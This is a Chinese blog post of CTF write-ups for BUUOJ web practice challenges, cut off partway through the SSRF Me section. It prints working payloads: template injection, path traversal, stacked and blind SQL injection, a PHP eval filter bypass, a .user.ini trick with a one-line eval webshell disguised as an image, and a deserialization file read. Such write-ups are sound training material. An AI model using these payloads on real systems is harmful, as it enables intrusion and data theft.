@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang=zh-CN>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="想了很久怎么给自己一点刷题动力，感觉得靠兴趣驱使。再加上有点想垂直上分，也增加一点技术力，所以就开了这波实时更新的小合集。有一部分的环境会尝试自己去搭建。（想改善一下玩 Docker 的技术力，而且也想收集一下题目原本很好玩的 flag）还有部分题目会被单独分离出来（譬如咱打过的比赛啥的），所以并不完整，嘿嘿。 [护网杯 2018]easy_tornado首先分别点进提供的三个页面，收集一波 hi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUOJ Web 一分题 WriteUp 合集">
+<meta property="og:url" content="https://lemonprefect.cn/zh-CN/posts/d24ddcdc.html">
+<meta property="og:site_name" content="Hexagon">
+<meta property="og:description" content="想了很久怎么给自己一点刷题动力，感觉得靠兴趣驱使。再加上有点想垂直上分，也增加一点技术力，所以就开了这波实时更新的小合集。有一部分的环境会尝试自己去搭建。（想改善一下玩 Docker 的技术力，而且也想收集一下题目原本很好玩的 flag）还有部分题目会被单独分离出来（譬如咱打过的比赛啥的），所以并不完整，嘿嘿。 [护网杯 2018]easy_tornado首先分别点进提供的三个页面，收集一波 hi">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-04-25T11:08:30.000Z">
+<meta property="article:modified_time" content="2021-04-28T07:47:47.226Z">
+<meta property="article:author" content="LemonPrefect">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          
+            <link rel="shortcut icon" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=48">
+          
+        
+      
+      
+        
+          
+            <link rel="icon" type="image/png" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=192">
+          
+        
+      
+      
+        
+          
+            <link rel="apple-touch-icon" size="180x180" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=180">
+          
+        
+      
+    
+    <!-- title -->
+    <title>BUUOJ Web 一分题 WriteUp 合集</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexagon" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="Hexagon" type="application/rss+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        <!-- 
+        <li><a class="icon" aria-label="上一篇 " href="/zh-TW/posts/9b2fbf24.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/zh-TW/posts/d24ddcdc.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        --!>
+
+        
+          
+          
+          
+            <li><a class="icon" aria-label="中文简体（大陆标准） " href="#">简</a></li>
+          
+            <li><a class="icon" aria-label="正体中文（台灣標準） " href="/zh-TW/posts/d24ddcdc.html">正</a></li>
+          
+        
+
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-CN/posts/d24ddcdc.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-CN/posts/d24ddcdc.html&text=BUUOJ Web 一分题 WriteUp 合集"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-CN/posts/d24ddcdc.html&title=BUUOJ Web 一分题 WriteUp 合集"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-CN/posts/d24ddcdc.html&is_video=false&description=BUUOJ Web 一分题 WriteUp 合集"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUOJ Web 一分题 WriteUp 合集&body=Check out this article: https://lemonprefect.cn/zh-CN/posts/d24ddcdc.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-CN/posts/d24ddcdc.html&title=BUUOJ Web 一分题 WriteUp 合集"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-CN/posts/d24ddcdc.html&title=BUUOJ Web 一分题 WriteUp 合集"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-CN/posts/d24ddcdc.html&title=BUUOJ Web 一分题 WriteUp 合集"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-CN/posts/d24ddcdc.html&title=BUUOJ Web 一分题 WriteUp 合集"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-CN/posts/d24ddcdc.html&name=BUUOJ Web 一分题 WriteUp 合集&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-CN/posts/d24ddcdc.html&t=BUUOJ Web 一分题 WriteUp 合集"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="toc-number">1.</span> <span class="toc-text">[护网杯 2018]easy_tornado</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HCTF-2018-WarmUp"><span class="toc-number">2.</span> <span class="toc-text">[HCTF 2018]WarmUp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">3.</span> <span class="toc-text">[强网杯 2019]随便注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF-2019-EasySQL"><span class="toc-number">4.</span> <span class="toc-text">[SUCTF 2019]EasySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HCTF-2018-admin"><span class="toc-number">5.</span> <span class="toc-text">[HCTF 2018]admin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RoarCTF-2019-Easy-Calc"><span class="toc-number">6.</span> <span class="toc-text">[RoarCTF 2019]Easy Calc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF-2019-CheckIn"><span class="toc-number">7.</span> <span class="toc-text">[SUCTF 2019]CheckIn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World"><span class="toc-number">8.</span> <span class="toc-text">[CISCN2019 华北赛区 Day2 Web1]Hack World</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook"><span class="toc-number">9.</span> <span class="toc-text">[网鼎杯 2018]Fakebook</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#De1CTF-2019-SSRF-Me"><span class="toc-number">10.</span> <span class="toc-text">[De1CTF 2019]SSRF Me</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="toc-number">11.</span> <span class="toc-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ZJCTF-2019-NiZhuanSiWei"><span class="toc-number">12.</span> <span class="toc-text">[ZJCTF 2019]NiZhuanSiWei</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="toc-number">13.</span> <span class="toc-text">[ACTF2020 新生赛]Include</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec"><span class="toc-number">14.</span> <span class="toc-text">[ACTF2020 新生赛]Exec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RoarCTF-2019-Easy-Java"><span class="toc-number">15.</span> <span class="toc-text">[RoarCTF 2019]Easy Java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BUUCTF-2018-Online-Tool"><span class="toc-number">16.</span> <span class="toc-text">[BUUCTF 2018]Online Tool</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-BackupFile"><span class="toc-number">17.</span> <span class="toc-text">[ACTF2020 新生赛]BackupFile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E"><span class="toc-number">18.</span> <span class="toc-text">[WUSTCTF2020]朴实无华</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2"><span class="toc-number">19.</span> <span class="toc-text">[WUSTCTF2020]颜值成绩查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web11"><span class="toc-number">20.</span> <span class="toc-text">[CISCN2019 华东南赛区]Web11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web"><span class="toc-number">21.</span> <span class="toc-text">[安洵杯 2019]easy_web</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="toc-number">22.</span> <span class="toc-text">[GXYCTF2019]禁止套娃</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment"><span class="toc-number">23.</span> <span class="toc-text">[网鼎杯 2018]Comment</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        BUUOJ Web 一分题 WriteUp 合集
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">LemonPrefect</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-04-25T11:08:30.000Z" itemprop="datePublished">2020-04-25</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>想了很久怎么给自己一点刷题动力，感觉得靠兴趣驱使。再加上有点想垂直上分，也增加一点技术力，所以就开了这波实时更新的小合集。有一部分的环境会尝试自己去搭建。（想改善一下玩 Docker 的技术力，而且也想收集一下题目原本很好玩的 flag）还有部分题目会被单独分离出来（譬如咱打过的比赛啥的），所以并不完整，嘿嘿。</p>
+<h3 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h3><p>首先分别点进提供的三个页面，收集一波 hint，可以得到 <code>md5(cookie_secret+md5(filename))</code> <code>flag in /fllllllllllllag</code> 这两个提示，还有一个 <code>render</code>。因为提示了是 tornado 的模板注入，但是接触得比较少，于是就查了一下，找到了这样的内容。</p>
+<blockquote>
+<p>在tornado模板中，存在一些可以访问的快速对象，例如 {{ escape(handler.settings["cookie"]) }}</p>
+<p>handler 指向 RequestHandler</p>
+<p>而 RequestHandler.settings 又指向 self.application.settings</p>
+<p>所有 handler.settings 就指向 RequestHandler.application.settings 了！</p>
+</blockquote>
+<p>但是目前是没有利用点的。这个时候，把题目的 GET 参数一通乱改之后出现了一个报错页面。欸，好机会！构造了一个 <code>error?msg=&#123;&#123;7*'7'&#125;&#125;</code> 结果返回了 ORZ。基本上确定是利用点了，但是我还是想确定一下，于是构造了 <code>error?msg=&#123;&#123;~1&#125;&#125;</code>，得到了 -2 的反馈，于是得以确认。根据上面查到的结果，构造 <code>error?msg=&#123;&#123;handler.settings&#125;&#125;</code> 得到 <code>cookie_secret</code> 为 <code>cae74968-3bf4-4be4-8505-e2db1c865c15</code>。根据上面的 hint 构造 <code>filename=/fllllllllllllag&amp;filehash=6740f481f040fa14e844929205445908</code> 即可得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f69df34c-c28c-4aa9-9bfe-7e73f9e61690&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h3><p>首先看了一波源码，找到 source.php 然后 source 可读，其中还有个 hint.php。于是去看 hint.php，得到了一个提示 <code>flag not here, and flag in ffffllllaaaagggg</code>。这里有一个点，因为一开始的构造决定了前两个检验必不可能 true，因此只能看后面 url 解码之后的校验，那就要保证构造能安全地通过这两个地方而不被截断。因为源码会不断地尝试截取问号前面的内容（当没有问号就在最后接一个问号然后截断，也就是相当于没有截断），因此只要在 <code>source.php</code> 后面编码一个问号 <code>%3f</code>，就能达成在解码后再截断的目的，从而可以通过 <code>in_array($_page, $whitelist)</code> 的检验从而返回 true。接下来就是目录穿越一波，构造 <code>?file=source.php?/../../../../../../ffffllllaaaagggg</code> 得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hctf&#123;e8a73a09cfdd1c9a11cca29b2bf9796f&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h3><p>既然是随便注嘛，上手试试看 <code>1&#39;#</code> 发现显示是正常的，于是进一步构造 <code>1&#39; union select 1,2,3 #</code> 然后就被 <code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code> 挡下来了。因为没得 <code>select</code> 了，查了一下，堆叠注入比较靠谱，于是构造一波 <code>1&#39;;show databases;#</code> 得到了正确的反馈。于是 <code>1&#39;;show tables;#</code>，看到了一个很可疑的表 <code>1919810931114514</code>。用 <code>1&#39;;desc `1919810931114514`;#</code> 查一波这个表的结构可以发现 flag 的字段。</p>
+<p>关键在于如何去读取它，查了一波之后发现可以悄悄地把表换掉，于是打出一套组合操作。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RENAME TABLE &#96;words&#96; TO &#96;wordstmp&#96;;</span><br><span class="line">RENAME TABLE &#96;1919810931114514&#96; TO &#96;words&#96;;</span><br><span class="line">ALTER TABLE &#96;words&#96; CHANGE &#96;flag&#96; &#96;id&#96; VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;</span><br></pre></td></tr></table></figure>
+
+<p>这样之后，默认所查的 words 表就变成了包含 flag 的表，这个时候随便构造个 <code>1&#39; or 1=1#</code>一读就能拿到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d2d32fa6-a7b4-44d0-8648-71ae2f1d1353&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><p>氦，这题我是真的写不出来，查了一波发现很多师傅说这题可以查到源码，但是我怎么扫都扫不出QAQ。对照着看了一波，发现需要把原本的 <code>||</code> 安排掉。这点使用 <code>PIPES_AS_CONCAT</code> 可以达成，于是构造 <code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code> 成功拿到 flag。</p>
+<p>源码中的 sql 语句是 <code>$sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;</code>，构造之后就变成了三句语句。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">set</span> sql_mode<span class="operator">=</span>PIPES_AS_CONCAT;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span>,flag <span class="keyword">from</span> flag;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUCTF&#123;SUCTF_baby_sql_chall_120993n810h3&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h3><p>这题在修改密码的页面给了个注释 hint，定向到 GitHub，上面有题目的源码。好奇的我看了一波同用户的其他 repo，找到了这题的环境，然后在 readme 看到了考点，于是顺着一找，找到了 <a target="_blank" rel="noopener" href="http://sunsec.top/2018/11/15/HCTF%20admin/">这篇文章</a>。于是就注册一波 <code>ᴬᴰᴹᴵᴺ</code> 然后登录再修改密码，再用 <code>admin</code> 和修改的密码登录即可得到 flag。</p>
+<p>关于对于 Unicode 字符的生成可以参考 <a target="_blank" rel="noopener" href="https://unicode-table.com/en/1D2C/">这个页面</a>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hctf&#123;un1cOdE_cHe4t_1s_FuNnying&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h3><p>首先随便算一个数，然后看看请求，发现请求给了 calc.php。尝试直接访问，发现源码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>利用点就是最后的 <code>eval()</code>。这波没给引号，于是有两种方案：使用 <code>chr()</code> 配合 ASCII 来构造，或者使用 hex 和按位取反来构造（这个是后来看<a target="_blank" rel="noopener" href="http://www.pdsdt.lovepdsdt.com/index.php/2019/10/15/2019_roarctf-writeup-ginkgo/#0x01_easy_calc">这个题解</a>的时候学到的。但是构造成 <code>?num=1;var_dump(scandir(chr(47)));</code> 之后 403 了。于是返回去看，发现首页源码中提了一句 WAF。于是顺手查了一波，发现可以使用一个空格去绕过。于是构造 <code>?%20num=1;var_dump(scandir(chr(47)));</code>，成功得到反馈。得到 <code>f1agg</code> 的线索。于是接下来构造 <code>?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));</code> 来读取这个文件，成功得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d7899aa0-16b1-4752-95f5-b9c5037caffa&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h3><p>啊，是看起来很熟悉的上传文件。老套路，构造好之后上传再用蚁剑连接就行。这里有一个要点，就是使用 .user.ini 来实现加载 php 文件之前加载一个指定的文件。</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#.user.ini</span></span><br><span class="line"><span class="comment">#define width 10</span></span><br><span class="line"><span class="comment">#define height 10</span></span><br><span class="line"><span class="attr">auto_prepend_file</span>=flag.jpg <span class="comment">#append for after </span></span><br></pre></td></tr></table></figure>
+
+<p>在 flag.jpg 里写上一句话。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag.jpg</span></span><br><span class="line">GIF89a?</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上传之后根据反馈可以知道 index.php 文件也与上传的文件位于一个目录下，因此只需要访问 index.php 即可达到目的。于是蚁剑访问 <code>.../uploads/48cd8b43081896fbd0931d204f947663/index.php</code> 然后打开文件管理即可得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUCTF&#123;U5er_1n1_01d_TR1ck&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p>这题，稍微试了一下之后发现是盲注，找了一下真和假的标记，掏出之前的二分模板，构造 <code>$sql = &quot;(ascii(substr((select(flag)from(flag)),&quot; . $i . &quot;,1))&gt;&quot; . $_mid . &quot;)^0&quot;;</code>  一顿怼，就能跑出 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f6bbbf99-0f93-4687-b2a4-5afc16dab5f5&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h3><p>首先上来一顿操作之后发现了 <code>/view.php?no=1</code> 这个注入利用点，一顿操作之后会发现 flag 根本不在数据库里，反而是一段序列化的字符串存在 <code>data</code> 字段。毕竟是网鼎杯，当然没有那么简单。尝试几下没有反馈之后查了一下，发现这题是有源码泄露的，于是下载下来。很容易发现是个反序列化，但是它有点不一样，但是主要的利用点在 <code>blog</code> 这个字段。当时的我并不知道要读啥文件，后来看了很多文章，有师傅说能扫出 flag.php。<span class="heimu" title="我太菜了">我还是太菜了</span></p>
+<p>于是这里就能接着往下构造了，我随便序列化了一下，得到了 <code>O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;lemon&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</code>，然后就是接着注入啦。按照一般套路，先构造 <code>select/**/1,2,3,4</code> 看看回显在哪里，然后可以看到在 2 的地方。然后就是想办法使回显按照我们序列化的字段来。因此，只需要构造 <code>.../view.php?no=2333/**/union/**/select/**/1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;lemon&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#39; /**/from/**/users%23</code>。这样页面就会尝试读取 flag.php。然后查看页面源码，然后 base64 解码即可得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;9e34256a-b20b-4776-86d0-bbebd2aecd02&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h3><p>这题首先就给了源码，复制下来仔细地整理（这里我就不贴了，占版面，网上一搜就有）。首先因为定义了 <code>waf()</code> 导致不能使用 <code>gopher</code> 和 <code>file</code>。但这同时也给了我们一个指向性信息，结合 hint 可知我们需要做的是读取文件 flag.txt。</p>
+<p>不难发现向 <code>/Delta</code> 发送请求最后可以执行到 <code>Exec()</code> 从而读文件。因此需要三个参数，准确地来说有两个是 Cookie。接下来看 <code>Exec()</code>，要读取文件并输出的话需要在参数 <code>action</code> 中包含 <code>read</code> 和 <code>scan</code>。于是构造 <code>action=readscan</code>。<code>param</code> 自然就是 <code>flag.txt</code>。接下来就是解决 <code>sign</code> 的环节。</p>
